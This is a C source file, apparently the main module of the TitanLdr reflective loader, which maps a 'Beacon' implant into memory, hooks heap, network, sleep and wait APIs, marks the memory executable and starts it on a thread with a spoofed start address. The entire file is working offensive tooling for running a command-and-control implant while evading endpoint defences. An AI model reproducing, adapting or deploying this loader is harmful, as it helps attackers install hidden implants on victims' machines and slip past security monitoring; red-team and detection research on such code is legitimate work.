//
// https://github.com/SecIdiot/TitanLdr/blob/master/Main.c
//

#include "include.h"

typedef BOOLEAN ( WINAPI * DLLMAIN_T )(
        HMODULE     ImageBase,
        DWORD       Reason,
        LPVOID      Parameter
);

typedef struct
{
    struct
    {
        D_API( NtGetContextThread );
        D_API( NtResumeThread );
        D_API( NtSetContextThread );
        D_API( RtlCreateUserThread );
        D_API( RtlUserThreadStart );

        D_API( NtAllocateVirtualMemory );
        D_API( NtProtectVirtualMemory );
        D_API( RtlCreateHeap );

    } ntdll;

} API, *PAPI;

typedef struct
{
    SIZE_T              Exec;
    SIZE_T              Full;
    PIMAGE_NT_HEADERS   NT;
    PIMAGE_DOS_HEADER   Dos;

} REG, *PREG;

#ifndef PTR_TO_HOOK
#define PTR_TO_HOOK( a, b )    U_PTR( U_PTR( a ) + OFFSET( b ) - OFFSET( Stub ) )
#endif

#ifndef memcpy
#define memcpy( destination, source, length ) __builtin_memcpy( destination, source, length );
#endif

SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
{
    PPEB    Peb;
    HANDLE  hNtdll;

    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    hNtdll = FindModule( H_LIB_NTDLL, Peb, NULL );
    
    if( !hNtdll )
    {
        return -1;
    };

    pApi->ntdll.NtAllocateVirtualMemory = FindFunction( hNtdll, H_API_NTALLOCATEVIRTUALMEMORY );
    pApi->ntdll.NtProtectVirtualMemory  = FindFunction( hNtdll, H_API_NTPROTECTVIRTUALMEMORY );
    pApi->ntdll.RtlCreateHeap           = FindFunction( hNtdll, H_API_RTLCREATEHEAP );

    if( !pApi->ntdll.NtAllocateVirtualMemory ||
        !pApi->ntdll.NtProtectVirtualMemory  ||
        !pApi->ntdll.RtlCreateHeap            )
    {
        return -1;
    };

    return STATUS_SUCCESS;
};

SECTION( B ) REG calculateRegions( VOID )
{
    REG         Reg = { 0 };
    SIZE_T      ILn = 0;   

    Reg.Dos = C_PTR( G_END() );
    Reg.NT  = C_PTR( U_PTR( Reg.Dos ) + Reg.Dos->e_lfanew );

    ILn = ( ( ( Reg.NT->OptionalHeader.SizeOfImage ) + 0x1000 - 1 ) &~( 0x1000 - 1 ) );
    Reg.Exec = ( ( ( G_END() - OFFSET( Stub ) ) + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );
    Reg.Full = ILn + Reg.Exec;
    
    return Reg;
};

SECTION( B ) VOID copyStub( PVOID buffer )
{   
    PVOID Destination   = buffer;
    PVOID Source        = C_PTR( OFFSET( Stub ) );
    DWORD Length        = U_PTR( G_END() - OFFSET( Stub ) );

    memcpy( Destination, Source, Length );
};

SECTION( B ) PVOID copyBeaconSections( PVOID buffer, REG reg )
{
    PVOID                   Map;
    PIMAGE_SECTION_HEADER   Sec;
    PVOID                   Destination;
    PVOID                   Source;
    DWORD                   Length;

    Map = C_PTR( U_PTR( buffer ) + reg.Exec );
    Sec = IMAGE_FIRST_SECTION( reg.NT );

    for( int i = 0; i < reg.NT->FileHeader.NumberOfSections; ++i )
    {
        Destination = C_PTR( U_PTR( Map ) + Sec[i].VirtualAddress );
        Source      = C_PTR( U_PTR( reg.Dos ) + Sec[i].PointerToRawData );
        Length      = Sec[i].SizeOfRawData;
        memcpy( Destination, Source, Length );
    };

    return Map;
};

SECTION( B ) VOID installHooks( PVOID map, PVOID buffer, PIMAGE_NT_HEADERS nt )
{
    PIMAGE_DATA_DIRECTORY Dir = Dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if( Dir->VirtualAddress )
    {
        LdrProcessIat( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ) );

        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_GETPROCESSHEAP,         PTR_TO_HOOK( buffer, GetProcessHeap_Hook ) );
        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_RTLALLOCATEHEAP,        PTR_TO_HOOK( buffer, RtlAllocateHeap_Hook ) );
        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_HEAPALLOC,              PTR_TO_HOOK( buffer, HeapAlloc_Hook ) );
        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_INTERNETCONNECTA,       PTR_TO_HOOK( buffer, InternetConnectA_Hook ) );
        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_NTWAITFORSINGLEOBJECT,  PTR_TO_HOOK( buffer, NtWaitForSingleObject_Hook ) );
        LdrHookImport( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), H_API_SLEEP,                  PTR_TO_HOOK( buffer, Sleep_Hook ) );
    };

    Dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if( Dir->VirtualAddress )
    {
        LdrProcessRel( C_PTR( map ), C_PTR( U_PTR( map ) + Dir->VirtualAddress ), nt->OptionalHeader.ImageBase );
    };
};

SECTION( B ) VOID fillStub( PVOID buffer, HANDLE heap, SIZE_T region )
{
    PSTUB Stub = ( PSTUB )buffer;

    Stub->Region = U_PTR( buffer );
    Stub->Size   = U_PTR( region );
    Stub->Heap   = heap;
};

SECTION( B ) VOID executeBeacon( PVOID entry )
{
    DLLMAIN_T Ent = entry;
    Ent( OFFSET( Start ), 1, NULL );
    Ent( OFFSET( Start ), 4, NULL );
};

SECTION( B ) VOID Loader( VOID ) 
{
    API         Api;
    REG         Reg;
    NTSTATUS    Status;
    PVOID       MemoryBuffer;
    PVOID       Map;
    HANDLE      BeaconHeap;
    ULONG       OldProtection = 0;  
    
    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Reg, sizeof( Reg ) );

    if( resolveLoaderFunctions( &Api ) == STATUS_SUCCESS )
    {
        Reg = calculateRegions();
        Status = Api.ntdll.NtAllocateVirtualMemory( ( HANDLE )-1, &MemoryBuffer, 0, &Reg.Full, MEM_COMMIT, PAGE_READWRITE );
        if( Status == STATUS_SUCCESS )
        {
            copyStub( MemoryBuffer );
            Map = copyBeaconSections( MemoryBuffer, Reg );
            BeaconHeap = Api.ntdll.RtlCreateHeap( HEAP_GROWABLE, NULL, 0, 0, NULL, NULL );
            fillStub( MemoryBuffer, BeaconHeap, Reg.Full );
            installHooks( Map, MemoryBuffer, Reg.NT );

            Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->SizeOfRawData;
            Status = Api.ntdll.NtProtectVirtualMemory( ( HANDLE )-1, &MemoryBuffer, &Reg.Exec, PAGE_EXECUTE_READ, &OldProtection );
            if( Status == STATUS_SUCCESS )
            {
                executeBeacon( C_PTR( U_PTR( Map ) + Reg.NT->OptionalHeader.AddressOfEntryPoint ) );
            };
        };
    };
};

SECTION( B ) NTSTATUS resolveAceFunctions( PAPI pApi )
{
    PPEB    Peb;
    HANDLE  hNtdll;

    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    hNtdll = FindModule( H_LIB_NTDLL, Peb, NULL );
    
    if( !hNtdll )
    {
        return -1;
    };

    pApi->ntdll.NtGetContextThread  = FindFunction( hNtdll, H_API_NTGETCONTEXTTHREAD );
    pApi->ntdll.NtSetContextThread  = FindFunction( hNtdll, H_API_NTSETCONTEXTTHREAD );
    pApi->ntdll.NtResumeThread      = FindFunction( hNtdll, H_API_NTRESUMETHREAD );
    pApi->ntdll.RtlUserThreadStart  = FindFunction( hNtdll, H_API_RTLUSERTHREADSTART );
    pApi->ntdll.RtlCreateUserThread = FindFunction( hNtdll, H_API_RTLCREATEUSERTHREAD );

    if( !pApi->ntdll.NtGetContextThread ||
        !pApi->ntdll.NtSetContextThread ||
        !pApi->ntdll.NtResumeThread     ||
        !pApi->ntdll.RtlUserThreadStart ||
        !pApi->ntdll.RtlCreateUserThread )
    {
        return -1;
    };

    return STATUS_SUCCESS;
};

SECTION( B ) NTSTATUS createBeaconThread( PAPI pApi, PHANDLE thread )
{
    BOOL Suspended = TRUE;
    LPTHREAD_START_ROUTINE StartAddress = pApi->ntdll.RtlUserThreadStart + 0x21;

    return pApi->ntdll.RtlCreateUserThread( ( HANDLE )-1, NULL, Suspended, 0, 0, 0, StartAddress, NULL, thread, NULL );
};

SECTION( B ) VOID Ace( VOID )
{
    API         Api;
    CONTEXT     Ctx;
    NTSTATUS    Status;
    HANDLE      Thread;

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

    if( resolveAceFunctions( &Api ) == STATUS_SUCCESS )
    {
        if( NT_SUCCESS( createBeaconThread( &Api, &Thread ) ) )
        {
            Ctx.ContextFlags = CONTEXT_CONTROL;
            Api.ntdll.NtGetContextThread( Thread, &Ctx );
            Ctx.Rip = C_PTR( Loader );

            Api.ntdll.NtSetContextThread( Thread, &Ctx );
            Api.ntdll.NtResumeThread( Thread, NULL );
        };
    };

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
};
